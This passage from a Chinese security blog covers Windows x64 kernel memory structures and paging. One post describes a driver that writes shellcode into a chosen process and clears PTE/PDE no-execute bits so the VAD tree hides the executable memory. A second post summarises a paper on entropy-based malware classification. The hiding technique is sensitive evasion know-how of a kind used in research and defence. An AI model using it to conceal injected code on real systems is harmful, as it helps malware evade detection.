class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD</span> &#123;</span></span><br><span class="line">  <span class="comment">/* 0x0000 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span> <span class="title">Core</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="comment">/* 0x0040 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> LongFlags2;</span><br><span class="line">      <span class="comment">/* 0x0040 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS2</span> <span class="title">VadFlags2</span>;</span></span><br><span class="line">    &#125;; <span class="comment">/* size: 0x0004 */</span></span><br><span class="line">  &#125; <span class="comment">/* size: 0x0004 */</span> u2;</span><br><span class="line">  <span class="comment">/* 0x0044 */</span> <span class="keyword">long</span> Padding_;</span><br><span class="line">  <span class="comment">/* 0x0048 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SUBSECTION</span>* <span class="title">Subsection</span>;</span></span><br><span class="line">  <span class="comment">/* 0x0050 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMPTE</span>* <span class="title">FirstPrototypePte</span>;</span></span><br><span class="line">  <span class="comment">/* 0x0058 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMPTE</span>* <span class="title">LastContiguousPte</span>;</span></span><br><span class="line">  <span class="comment">/* 0x0060 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ViewLinks</span>;</span></span><br><span class="line">  <span class="comment">/* 0x0070 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span>* <span class="title">VadsProcess</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="comment">/* 0x0078 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_VAD_SEQUENTIAL_INFO</span> <span class="title">SequentialVa</span>;</span></span><br><span class="line">      <span class="comment">/* 0x0078 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMEXTEND_INFO</span>* <span class="title">ExtendedInfo</span>;</span></span><br><span class="line">    &#125;; <span class="comment">/* size: 0x0008 */</span></span><br><span class="line">  &#125; <span class="comment">/* size: 0x0008 */</span> u4;</span><br><span class="line">  <span class="comment">/* 0x0080 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FILE_OBJECT</span>* <span class="title">FileObject</span>;</span></span><br><span class="line">&#125; MMVAD, *PMMVAD; <span class="comment">/* size: 0x0088 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span> <span class="title">VadNode</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span>* <span class="title">NextVad</span>;</span></span><br><span class="line">  &#125;; <span class="comment">/* size: 0x0018 */</span></span><br><span class="line">  <span class="comment">/* 0x0018 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> StartingVpn;</span><br><span class="line">  <span class="comment">/* 0x001c */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> EndingVpn;</span><br><span class="line">  <span class="comment">/* 0x0020 */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> StartingVpnHigh;</span><br><span class="line">  <span class="comment">/* 0x0021 */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> EndingVpnHigh;</span><br><span class="line">  <span class="comment">/* 0x0022 */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> CommitChargeHigh;</span><br><span class="line">  <span class="comment">/* 0x0023 */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> SpareNT64VadUChar;</span><br><span class="line">  <span class="comment">/* 0x0024 */</span> <span class="keyword">long</span> ReferenceCount;</span><br><span class="line">  <span class="comment">/* 0x0028 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span> <span class="title">PushLock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="comment">/* 0x0030 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> LongFlags;</span><br><span class="line">      <span class="comment">/* 0x0030 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS</span> <span class="title">VadFlags</span>;</span></span><br><span class="line">    &#125;; <span class="comment">/* size: 0x0004 */</span></span><br><span class="line">  &#125; <span class="comment">/* size: 0x0004 */</span> u;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="comment">/* 0x0034 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> LongFlags1;</span><br><span class="line">      <span class="comment">/* 0x0034 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS1</span> <span class="title">VadFlags1</span>;</span></span><br><span class="line">    &#125;; <span class="comment">/* size: 0x0004 */</span></span><br><span class="line">  &#125; <span class="comment">/* size: 0x0004 */</span> u1;</span><br><span class="line">  <span class="comment">/* 0x0038 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_VAD_EVENT_BLOCK</span>* <span class="title">EventList</span>;</span></span><br><span class="line">&#125; MMVAD_SHORT, *PMMVAD_SHORT; <span class="comment">/* size: 0x0040 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span>* <span class="title">Children</span>[2];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      <span class="comment">/* 0x0000 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span>* <span class="title">Left</span>;</span></span><br><span class="line">      <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span>* <span class="title">Right</span>;</span></span><br><span class="line">    &#125;; <span class="comment">/* size: 0x0010 */</span></span><br><span class="line">  &#125;; <span class="comment">/* size: 0x0010 */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 0x0010 */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> Red : <span class="number">1</span>; <span class="comment">/* bit position: 0 */</span></span><br><span class="line">    <span class="comment">/* 0x0010 */</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> Balance : <span class="number">2</span>; <span class="comment">/* bit position: 0 */</span></span><br><span class="line">    <span class="comment">/* 0x0010 */</span> <span class="keyword">unsigned</span> __int64 ParentValue;</span><br><span class="line">  &#125;; <span class="comment">/* size: 0x0008 */</span></span><br><span class="line">&#125; RTL_BALANCED_NODE, *PRTL_BALANCED_NODE; <span class="comment">/* size: 0x0018 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_AVL_TREE</span> &#123;</span></span><br><span class="line">  <span class="comment">/* 0x0000 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BALANCED_NODE</span>* <span class="title">Root</span>;</span></span><br><span class="line">&#125; RTL_AVL_TREE, *PRTL_AVL_TREE; <span class="comment">/* size: 0x0008 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EPROCESS</span> &#123;</span></span><br><span class="line">    …</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_AVL_TREE</span> <span class="title">VadRoot</span>;</span></span><br><span class="line">    …</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_FLAGS</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> /* <span class="title">bitfield</span> */ &#123;</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> VadType : <span class="number">3</span>; <span class="comment">/* bit position: 0 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> Protection : <span class="number">5</span>; <span class="comment">/* bit position: 3 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> PreferredNode : <span class="number">6</span>; <span class="comment">/* bit position: 8 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> NoChange : <span class="number">1</span>; <span class="comment">/* bit position: 14 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> PrivateMemory : <span class="number">1</span>; <span class="comment">/* bit position: 15 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> PrivateFixup : <span class="number">1</span>; <span class="comment">/* bit position: 16 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> ManySubsections : <span class="number">1</span>; <span class="comment">/* bit position: 17 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> Enclave : <span class="number">1</span>; <span class="comment">/* bit position: 18 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> DeleteInProgress : <span class="number">1</span>; <span class="comment">/* bit position: 19 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> PageSize64K : <span class="number">1</span>; <span class="comment">/* bit position: 20 */</span></span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> RfgControlStack : <span class="number">1</span>; <span class="comment">/* bit position: 21 */</span> </span><br><span class="line">    <span class="comment">/* 0x0000 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> Spare : <span class="number">10</span>; <span class="comment">/* bit position: 22 */</span></span><br><span class="line">  &#125;; <span class="comment">/* bitfield */</span></span><br><span class="line">&#125; MMVAD_FLAGS, *PMMVAD_FLAGS; <span class="comment">/* size: 0x0004 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_VAD_EVENT_BLOCK</span> &#123;</span></span><br><span class="line">  <span class="comment">/* 0x0000 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_VAD_EVENT_BLOCK</span>* <span class="title">Next</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KGATE</span> <span class="title">Gate</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMADDRESS_LIST</span> <span class="title">SecureInfo</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BITMAP_EX</span> <span class="title">BitMap</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMINPAGE_SUPPORT</span>* <span class="title">InPageSupport</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_LARGEPAGE_IMAGE_INFO</span> <span class="title">LargePage</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ETHREAD</span>* <span class="title">CreatingThread</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_SUB64K_FREE_RANGES</span> <span class="title">PebTebRfg</span>;</span></span><br><span class="line">    <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_RFG_PROTECTED_STACK</span> <span class="title">RfgProtectedStack</span>;</span></span><br><span class="line">  &#125;; <span class="comment">/* size: 0x0038 */</span></span><br><span class="line">  <span class="comment">/* 0x0040 */</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> WaitReason;</span><br><span class="line">  <span class="comment">/* 0x0044 */</span> <span class="keyword">long</span> __PADDING__[<span class="number">1</span>];</span><br><span class="line">&#125; MI_VAD_EVENT_BLOCK, *PMI_VAD_EVENT_BLOCK; <span class="comment">/* size: 0x0048 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MI_RFG_PROTECTED_STACK</span> &#123;</span></span><br><span class="line">  <span class="comment">/* 0x0000 */</span> <span class="keyword">void</span>* ControlStackBase;</span><br><span class="line">  <span class="comment">/* 0x0008 */</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MMVAD_SHORT</span>* <span class="title">ControlStackVad</span>;</span></span><br><span class="line">&#125; MI_RFG_PROTECTED_STACK, *PMI_RFG_PROTECTED_STACK; <span class="comment">/* size: 0x0010 */</span></span><br></pre></td></tr></table></figure>

<p>虚拟内存分为两类：</p>
<p>（1）通过<code>VirtualAlloc/VirtualAllocEx </code>申请的：Private Memory ，独享物理页</p>
<p>（2）通过<code>CreateFlieMapping</code>映射的：Mapped Memory，多个进程共享物理页。</p>
<h4 id="分页机制"><a href="#分页机制" class="headerlink" title="分页机制"></a>分页机制</h4><p>在32位里面有<code>2-9-9-12</code>、<code>10-10-12</code>两种分页模式，而在64位下只有一种分页模式，即<code>9-9-9-9-12</code>分页模式。在64位系统中，实际上CPU只使用了其中的48位用于寻址。</p>
<p><code>9-9-9-9-12</code>分页表示物理地址拥有四级页表，在Intel开发手册中，将这四级页表分别称为<code>PML4E</code>、<code>PDPTE</code>、<code>PDE</code>、<code>PTE</code>，但微软的命名方式略有不同，将这四级页表分别称为<code>PXE</code>、<code>PPE</code>、<code>PDE</code>、<code>PTE</code>，WinDbg中也是如此</p>
<p>启用分页模式条件：<code>cr0.PG = 1</code> 且 <code>cr0.PE = 1</code></p>
<p>根据不同CPU架构及特性主要分为三种模式，处于哪种模式视寄存器属性不同：</p>
<ul>
<li> 32-bit paging(32位OS): <code>cr0.PG = 1</code> 、 <code>cr4.PAE = 0</code></li>
<li> PAE paging(32位OS且开启了PAE): <code>cr0.PG = 1</code> 、 <code>cr4.PAE = 1</code> 、 <code>IA32_EFER.LME = 0</code></li>
<li> IA-32e paging(64位OS): <code>cr0.PG = 1</code> 、 <code>cr4.PAE = 1</code> 、 <code>IA32_EFER.LME = 1</code></li>
</ul>
<p>主要研究的是<code>IA-32e</code>模式下的内存，这里<code>IA-32e</code>提供了三种页转换模型：</p>
<ul>
<li>4k：PML4T,PDPT,PDT和PT</li>
<li>2M：PML4T，PDPT和PDT</li>
<li>1G：PML4T和PDPT</li>
</ul>
<p>在4kb小页的情况下，64位可以拆分为以下几段，即9-9-9-9-9-12分页</p>
<blockquote>
<p>sign extended – 符号扩展位 — 在线性地址48~63bit </p>
<p>PML4 entry – 在线性地址39～47bit用于索引PML4 entry，指向PDP </p>
<p>PDP entry – 在线性地址的30～38bit用来索引PDP entry，指向PDE </p>
<p>PDE entry – 在线性地址的21～29bit用来索引PDEentry，指向PTE </p>
<p>PTE entry – 在线性地址的12～20bit用来索引PTE entry，指向page offset</p>
<p>page offse t – 在线性地址的0～11bit提供在页中的offset</p>
</blockquote>
<h4 id="页表基址"><a href="#页表基址" class="headerlink" title="页表基址"></a>页表基址</h4><p>CR3中保存的页表基址是物理地址，程序如果直接访问这个地址，实际上访问的是一个线性地址，会被虚拟内存管理器解析成另一个地址.实际上，操作系统会将当前进程的物理页映射在某个线性地址中，以供程序读取自己的页表内容。</p>
<p>在x86系统中，页表基址是固定的，位于<code>0xC0000000</code>，将这个线性地址进行解析，访问其物理页的内容，会发现从这个地址开始，里面保存的数据为当前程序的所有物理页地址。</p>
<p>而在x64系统中，页表基址不再是固定的值，而是每次系统启动后随机生成的可以在WinDbg中查看0地址对应的线性地址来确定当前的页表基址（!pte 0）。每个物理页占8个字节，例如，第一个物理页地址位于线性地址<code>0xFFFFF38000000000</code>，第二个物理页地址位于线性地址<code>0xFFFF800000000008</code>，每个物理页中包含1024个字节的数据。</p>
<h4 id="MmIsAddressValid"><a href="#MmIsAddressValid" class="headerlink" title="MmIsAddressValid"></a>MmIsAddressValid</h4><p>探索系统的分页机制最好的办法是对内核中的 <code>MiIsAddressValid</code> 函数的实现进行分析。win7和win10的64位系统下使用的是两种不同的查找 <code>pte</code> 、 <code>pde</code> 、 <code>pdpte</code> 、 <code>pml4e</code> 的方式。接下来分别对两个系统的该函数进行相应的分析</p>
<p><strong>win7 64位下的函数分析</strong></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718173242799.png" alt="image-20220718173242799"></p>
<p>首先通过移位，查看前16位是否为全0或者全1，如果不是，返回不合法。然后通过移位分别分出9-9-9-9-12这5部分，然后加上相应的基址，找到对应的 <code>pte,pde,pdpte,pml4e</code> ，并判断P位是否为0。如果为0返回不合法。</p>
<p>该函数较为简单，将减去的数值取反加一可以得到对应的基址。可得在win7 64位下，其 <code>PTE_BASE</code> 为 <code>fffff68000000000</code> 。</p>
<p><strong>win10 64位下的函数分析</strong></p>
<p>在 <code>win10 1607</code> 以上版本，微软为分页基址加上了随机页目录基址，这让定位 <code>pte</code> 变得更加困难。 <code>PTE_BASE</code> 不再是之前写死的值，而是每次开机都会随机在一定的范围内挑选一个值。而在 <code>win10 64</code> 位下的 <code>MmIsAddressValidEx</code> 函数中，其更换了另外一套寻找 <code>pte,pde,pdpte,pml4e</code> 的方法，如下</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718173735557.png" alt="image-20220718173735557"></p>
<p>可以看到这里计算 <code>pte,pde,pdpte,pml4e</code> 的时候用的都只有一个 <code>pte_base</code> ，不再像win7那样求每个值的时候都使用一个不同的基址。</p>
<h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><p>在申请一块不可执行的内存后通过修改 <code>pte</code> 与 <code>pde</code> 手动将页面设置为可执行，达到隐藏可执行内存的目的。</p>
<p>首先是定位定位<code>PTE</code>、<code>PDE</code>、<code>PPE</code>、<code>PXE</code>，<code>PTE_BASE</code>有两种情况，当是Win10 1607以上，就需要自己通过逆向的方式提取硬编码进行定位，这里通过<code>MmGetVirtualForPhysical</code>函数加偏移的方式进行定位。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718195402087.png" alt="image-20220718195402087"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718195002005.png" alt="image-20220718195002005"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718193319749.png" alt="image-20220718193319749"></p>
<p>然后是一个分配内存的函数，可以往指定pid的进程中写入shellcode，并隐藏其可执行属性，使这块内存在vad树中看来是不可执行的。</p>
<p>我们找到目标进程，然后通过<code>KeStackAttachProcess</code>函数实现进程挂靠，即把自己的cr3换成目标进程的cr3(<strong>CR3含有存放页目录表页面的物理地址</strong>)。</p>
<p>然后使用<code>ZwAllocateVirtualMemory</code>先分配一块可读可写的内存。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718195106508.png" alt="image-20220718195106508"></p>
<p>首先将前3位符号位去掉得到内存的起始地址和结束地址，然后循环判断，必须每一块内存都需要修改。结合<code>MmIsAddressValid</code>并判断<code>valid</code>是否为1，这里如果<code>valid</code>为0则该块内存无效，然后将<code>no_execute</code>置0即可获得可执行权限</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220718195537373.png" alt="image-20220718195537373"></p>
<h4 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h4><p>其实就是通过修改pde和pte属性隐藏可执行内存，在编写这样的驱动的过程中也能巩固对x64分页机制的认识。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/0ZtgGviuTbhZ9TpOnySZkg">x64下隐藏可执行内存</a>，<a target="_blank" rel="noopener" href="https://github.com/smallzhong/hide_execute_memory">hide_excute_memory</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://drunkmars.top/2022/02/15/ssdt%20hook/">主要参考博客</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/07/06/paper/Malware%20classification%20using%20a%20byte-granularity/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/06/paper/Malware%20classification%20using%20a%20byte-granularity/" class="post-title-link" itemprop="url">Malware classification using a byte-granularity feature based on structural entropy</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-07-06 00:00:00 / 修改时间：16:05:47" itemprop="dateCreated datePublished" datetime="2022-07-06T00:00:00+08:00">2022-07-06</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/paper-reading/" itemprop="url" rel="index"><span itemprop="name">paper reading</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​        熵是一种用于识别恶意软件的典型指标。结构熵是一个熵值的序列，其中一个分段的熵是由熵本身的方程计算出来的。然而，基于熵的特征很可能是抽象的，并且遗漏了重要的信息。本文提出了一种涉及结构熵概念的特征工程技术。这种技术允许将每个节段表示为每个字节值的256个熵值，但不能表示为一个熵值。我们的研究是**细粒度结构熵(FiG_SE)**，它包含了所有段的全局模式、相邻段的局部模式以及段内的内部模式。为了从我们的熵特征中提取更高层次的特征，我们使用了卷积神经网络(CNN)架构，因为它可以有效地提取局部和全局模式，特别是对于移位不变模式。此外，我们与CNN相结合的研究对混淆技术具有很强的弹性，也非常适合于恶意软件的检测。</p>
<h3 id="主要工作"><a href="#主要工作" class="headerlink" title="主要工作"></a>主要工作</h3><ul>
<li>我们提出了一种新的处理二进制文件的特征工程方法。该方法具有提取二进制文件的全局属性和段中的局部属性的能力，这是通过关注具有字节粒度的二进制文件的段来实现的。</li>
<li>与以前的分类模型相比，我们使用FiG_SE的分类模型在训练数据集上具有竞争性能，在基于微软恶意软件分类挑战数据集标准的测试数据集上具有最佳性能。</li>
<li>我们证明了FiG_SE对<strong>混淆技术</strong>具有很强的弹性。</li>
<li>FiG_SE对不同的基于熵的特征具有优越的泛化性能；与现有的其他特征相比，它具有更高的准确率和F1分数。</li>
</ul>
<p>通常的结构熵一般是将二进制文件分成相等长度的段，然后计算每个段的熵值。该篇文章中的方法是，将每一个段用256个熵值表示，而不是单个熵值。为此，先将一个文件分成几个部分，类似于结构熵。然后，为每个段提取256个不同字节值的熵值。因此，FiG_SE形成了一个向量序列，每个向量序列由所有二进制段的256个熵值组成。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220706150958183.png" alt="image-20220706150958183"></p>
<p>一个段表示为从0×00到0×FF的256个熵值。关于段的详细信息有助于解决通过将段抽象为单个熵值而产生的段之间的模糊性。因此，提出的熵分析可以通过分析熵值来区分具有相同熵的段。</p>
<p>FiG_SE通过以下步骤提取：首先，将文件划分为大小相同的段。其次，每个段内256个不同字节的熵值由公式“**P(i)log2P(i)**”计算。最后，附加每个段的合成值。该特征最终形成为一个向量序列，每个二进制文件的每个段有256个熵值。如上图所示，FiG_SE是每个文件n个段的n个向量的序列，其中一个段的向量在0×00到0×FF之间有256个熵值。</p>
<h3 id="模型架构"><a href="#模型架构" class="headerlink" title="模型架构"></a>模型架构</h3><p>采用CNN作为我们的分类模型的底层架构，有两个原因。首先，CNN可以有效地识别低水平特征和高级特征。在我们的特征域中，低级特征表示一个段或相邻段的局部模式，而高级特征表示跨所有段的全局模式。其次，我们利用CNN的移位不变模式的功能。二进制文件中的字节序列（例如，代码片段和函数）可以被编译器自动重新定位，或被黑客恶意地重新定位。CNN的使用允许分类模型通过识别不同的模式来捕获二进制文件中存在的移位不变模式。</p>
<p>它由三个卷积层组成，每个卷积层后面都是一个池化层、三个全连接层和一个分类层。FiG_SE的二维(2D)特征向量作为输入输入CNN，并划分为一个恶意软件家族。</p>
<p>第一层识别分段中或相邻段之间的局部特征，后一层根据前一层提取的特征图捕获全局特征。随后，三个完全连接的层采用提取的高级特征，输出9个恶意软件家族。为此，最后一个卷积层的特征在第一个完全连接层之前被平坦为一个一维向量。softmax层作为最终的分类层。softmax函数通过计算之前完全连接层的合成值来生成归一化概率分布。在这个模型中，返回了9个类的归一化概率分布。然后，对FiG_SE特征预测一个概率值最高的类</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220706155633427.png" alt="image-20220706155633427"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/06/30/Cheese_point/x64%E4%B8%8B%E9%9A%90%E8%97%8F%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/30/Cheese_point/x64%E4%B8%8B%E9%9A%90%E8%97%8F%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98/" class="post-title-link" itemprop="url">注册表监控</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-06-30 00:00:00 / 修改时间：19:23:18" itemprop="dateCreated datePublished" datetime="2022-06-30T00:00:00+08:00">2022-06-30</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
